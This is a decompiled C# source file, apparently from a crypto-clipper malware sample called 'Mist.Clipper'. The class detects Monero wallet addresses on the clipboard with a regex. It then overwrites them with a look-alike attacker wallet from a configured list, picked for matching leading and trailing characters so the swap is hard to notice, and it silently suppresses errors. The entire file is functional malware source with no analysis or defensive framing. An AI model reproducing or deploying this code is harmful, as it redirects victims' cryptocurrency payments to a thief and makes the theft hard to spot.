using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x0200007F RID: 127
	internal class CheckXMR
	{
		// Token: 0x060002E6 RID: 742 RVA: 0x00013638 File Offset: 0x00011838
		public static bool Clipregex(string clipboard)
		{
			string text = clipboard.Trim();
			return text.Length >= 93 && text.Length <= 96 && new Regex(CheckXMR.Key).IsMatch(text);
		}

		// Token: 0x060002E7 RID: 743 RVA: 0x00013678 File Offset: 0x00011878
		internal static void SetsXMR(string originalClipboardText)
		{
			try
			{
				string b = originalClipboardText.Trim();
				HashSet<string> hashSet = new HashSet<string>();
				int num = 0;
				foreach (string text in Config.walletsxmr.ToList<string>())
				{
					int num2 = CheckXMR.FirstCharFitNum(text, b);
					if (num2 >= num)
					{
						if (num2 == num)
						{
							hashSet.Add(text);
						}
						else if (num2 > num)
						{
							hashSet.Clear();
							num = num2;
							hashSet.Add(text);
							Clipboard.SetText(text);
						}
					}
				}
				int num3 = 0;
				foreach (string text2 in hashSet)
				{
					int num4 = CheckXMR.LastCharFitNum(text2, b);
					if (num4 > num3)
					{
						num3 = num4;
						Clipboard.SetText(text2);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060002E8 RID: 744 RVA: 0x00012DC0 File Offset: 0x00010FC0
		private static int LastCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[a.Length - 1 - num2] != b[b.Length - 1 - num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x060002E9 RID: 745 RVA: 0x00012E1C File Offset: 0x0001101C
		private static int FirstCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[num2] != b[num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x04000181 RID: 385
		public static string Key = "^(4|8)[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$";
	}
}
